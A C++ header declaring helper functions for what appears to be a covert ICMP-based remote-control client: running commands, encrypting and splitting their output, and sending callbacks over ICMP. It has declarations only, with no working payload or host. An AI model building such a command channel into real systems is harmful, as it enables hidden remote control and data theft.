#pragma once

#include "icmp.h"
#include <sodium.h>
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <string>
#include <vector>
#include <codecvt>
#include <locale>
// Forward declarations
class Client;
class AESHandler;

// Declare global variables (use smart pointers or encapsulate if possible in the future)
extern AESHandler* aesHandler;
extern Client* client;

// Helper namespace for better organization
namespace Helper {
    
    bool Run(const std::wstring& command, const std::wstring& arguments, std::string& output);
    
    std::vector<unsigned char> hex_to_bytes(const std::string& hex);

    std::string bytes_to_hex(const std::vector<unsigned char>& bytes);

    std::vector<std::string> EncryptAndSplit(const std::string& client_response);

    void Callback(SOCKET sockfd, Custom_icmp icmp, const std::string& ip_addr, bool connected, bool exec, bool exit = false);
    
    std::wstring to_wstring(const std::string& stringToConvert);

    
    std::vector<std::string> splitString(const std::string& str);

    
    std::vector<std::string> split(const std::string& str, int n);

} // namespace Helper
